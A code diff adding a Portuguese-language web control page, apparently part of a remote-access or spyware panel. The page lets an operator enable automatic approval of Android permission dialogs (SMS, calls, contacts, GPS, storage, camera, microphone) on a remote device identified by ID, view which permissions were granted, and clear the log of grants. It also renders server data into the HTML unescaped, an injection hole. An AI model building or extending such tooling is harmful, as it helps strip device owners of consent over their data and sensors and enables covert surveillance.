@@ -1,0 +1,263 @@
+<div class="ui container segment">
+    <h3 class="ui header">Auto-concessão de Permissões</h3>
+    <p>Aprova automaticamente janelas de permissões do sistema (SMS, contatos, armazenamento, etc.).</p>
+
+    <div class="ui divider"></div>
+
+    <!-- Status e Controle -->
+    <div class="ui grid">
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Controle de Auto-concessão</h4>
+                <p>Habilite/desabilite a concessão automática de permissões.</p>
+
+                <div class="ui form">
+                    <div class="field">
+                        <div class="ui toggle checkbox" id="autoGrantToggle">
+                            <input type="checkbox" id="autoGrantEnabled">
+                            <label>Auto-concessão <span id="autoGrantStatus">Desabilitada</span></label>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="eight wide column">
+            <div class="ui segment">
+                <h4>Permissões Já Concedidas</h4>
+                <p>Permissões aprovadas automaticamente.</p>
+
+                <div id="grantedPermissionsList" style="max-height: 200px; overflow-y: auto; border: 1px solid #ddd; border-radius: 4px; padding: 10px;">
+                    <p style="color: #999;">Nenhuma permissão concedida ainda</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Permissões Suportadas -->
+    <div class="ui segment">
+        <h4>Permissões Suportadas para Auto-concessão</h4>
+        <p>Estas permissões podem ser automaticamente concedidas ao serem solicitadas:</p>
+
+        <div class="ui grid">
+            <div class="four wide column">
+                <div class="ui segment compact">
+                    <strong>Comunicação</strong>
+                    <ul style="list-style: none; padding: 10px 0;">
+                        <li><i class="check icon" style="color: green;"></i> SMS</li>
+                        <li><i class="check icon" style="color: green;"></i> Chamadas</li>
+                        <li><i class="check icon" style="color: green;"></i> Contatos</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="four wide column">
+                <div class="ui segment compact">
+                    <strong>Localização</strong>
+                    <ul style="list-style: none; padding: 10px 0;">
+                        <li><i class="check icon" style="color: green;"></i> GPS</li>
+                        <li><i class="check icon" style="color: green;"></i> Localização Precisa</li>
+                        <li><i class="check icon" style="color: green;"></i> Localização Aproximada</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="four wide column">
+                <div class="ui segment compact">
+                    <strong>Armazenamento</strong>
+                    <ul style="list-style: none; padding: 10px 0;">
+                        <li><i class="check icon" style="color: green;"></i> Leitura</li>
+                        <li><i class="check icon" style="color: green;"></i> Escrita</li>
+                        <li><i class="check icon" style="color: green;"></i> Acesso Completo</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="four wide column">
+                <div class="ui segment compact">
+                    <strong>Dispositivo</strong>
+                    <ul style="list-style: none; padding: 10px 0;">
+                        <li><i class="check icon" style="color: green;"></i> Câmera</li>
+                        <li><i class="check icon" style="color: green;"></i> Microfone</li>
+                        <li><i class="check icon" style="color: green;"></i> Sensores</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui divider"></div>
+
+    <!-- Log de Permissões -->
+    <div class="ui segment">
+        <h4>Log de Concessões de Permissões</h4>
+        <p>Histórico de permissões solicitadas e concessão automática.</p>
+
+        <table class="ui celled table">
+            <thead>
+                <tr>
+                    <th>Permissão</th>
+                    <th>Data/Hora</th>
+                    <th>Status</th>
+                    <th>Detalhes</th>
+                </tr>
+            </thead>
+            <tbody id="permissionLogTable">
+                <tr>
+                    <td colspan="4" style="text-align: center; color: #999;">
+                        <i class="spinner loading icon"></i>
+                        Carregando log...
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+
+        <button class="ui mini red button" onclick="clearPermissionLog(this)" style="margin-top: 10px;">
+            <i class="trash icon"></i>
+            Limpar Log
+        </button>
+    </div>
+
+    <script>
+        // Carregar dados ao iniciar
+        $(document).ready(function() {
+            loadPermissionGrantStatus();
+            loadPermissionLog();
+
+            // Setup toggle
+            $('#autoGrantToggle').on('change', function() {
+                toggleAutoGrant($(this).is(':checked'));
+            });
+        });
+
+        function getDeviceId() {
+            const match = window.location.pathname.match(/\/manage\/([^\/]+)/);
+            return match ? match[1] : '';
+        }
+
+        function loadPermissionGrantStatus() {
+            $.get(`/manage/${getDeviceId()}/pg/log`, function(data) {
+                if (data.error === false && data.data) {
+                    const config = data.data;
+                    
+                    // Atualizar status
+                    if (config.autoGrantEnabled) {
+                        $('#autoGrantToggle').checkbox('check');
+                        $('#autoGrantStatus').text('Habilitada').css('color', 'green');
+                    } else {
+                        $('#autoGrantToggle').checkbox('uncheck');
+                        $('#autoGrantStatus').text('Desabilitada').css('color', 'red');
+                    }
+
+                    // Atualizar lista de permissões concedidas
+                    if (config.grantedPermissions && config.grantedPermissions.length > 0) {
+                        let html = '';
+                        config.grantedPermissions.forEach(perm => {
+                            html += `
+                                <div style="padding: 8px; border-bottom: 1px solid #eee;">
+                                    <i class="check circle icon" style="color: green;"></i>
+                                    ${perm}
+                                </div>
+                            `;
+                        });
+                        $('#grantedPermissionsList').html(html);
+                    }
+                }
+            });
+        }
+
+        function loadPermissionLog() {
+            $.get(`/manage/${getDeviceId()}/pg/log`, function(data) {
+                if (data.error === false && data.data && data.data.permissionLog) {
+                    const permissionLog = data.data.permissionLog;
+                    
+                    if (permissionLog.length === 0) {
+                        $('#permissionLogTable').html(`
+                            <tr>
+                                <td colspan="4" style="text-align: center; color: #999;">
+                                    Nenhuma permissão registrada
+                                </td>
+                            </tr>
+                        `);
+                        return;
+                    }
+
+                    let html = '';
+                    permissionLog.forEach(log => {
+                        const statusIcon = log.success 
+                            ? '<i class="check icon" style="color: green;"></i> Concedida'
+                            : '<i class="times icon" style="color: red;"></i> Negada';
+
+                        const timestamp = new Date(log.timestamp).toLocaleString('pt-BR');
+
+                        html += `
+                            <tr>
+                                <td>${log.permission || '-'}</td>
+                                <td>${timestamp}</td>
+                                <td>${statusIcon}</td>
+                                <td>${log.details || '-'}</td>
+                            </tr>
+                        `;
+                    });
+
+                    $('#permissionLogTable').html(html);
+                } else {
+                    $('#permissionLogTable').html(`
+                        <tr>
+                            <td colspan="4" style="text-align: center; color: #999;">
+                                Erro ao carregar log
+                            </td>
+                        </tr>
+                    `);
+                }
+            }).fail(function() {
+                $('#permissionLogTable').html(`
+                    <tr>
+                        <td colspan="4" style="text-align: center; color: #999;">
+                            Erro ao carregar dados
+                        </td>
+                    </tr>
+                `);
+            });
+        }
+
+        function toggleAutoGrant(enabled) {
+            $.post(`/manage/${getDeviceId()}/pg/enable/${enabled}`, function(data) {
+                if (data.error === false) {
+                    showNotification('#2ecc71', data.message);
+                    loadPermissionGrantStatus();
+                } else {
+                    showNotification('#f03434', data.error || 'Erro ao atualizar');
+                }
+            }).fail(function() {
+                showNotification('#f03434', 'Erro ao conectar ao servidor');
+            });
+        }
+
+        function clearPermissionLog(element) {
+            if (!confirm('Tem certeza que deseja limpar o log de permissões?')) return;
+
+            $(element).addClass('loading');
+            
+            $.ajax({
+                type: 'DELETE',
+                url: `/manage/${getDeviceId()}/pg/log`,
+                success: function(data) {
+                    if (data.error === false) {
+                        showNotification('#2ecc71', data.message);
+                        loadPermissionLog();
+                    } else {
+                        showNotification('#f03434', data.error);
+                    }
+                    $(element).removeClass('loading');
+                },
+                error: function() {
+                    showNotification('#f03434', 'Erro ao limpar log');
+                    $(element).removeClass('loading');
+                }
+            });
+        }
+    </script>
+</div>
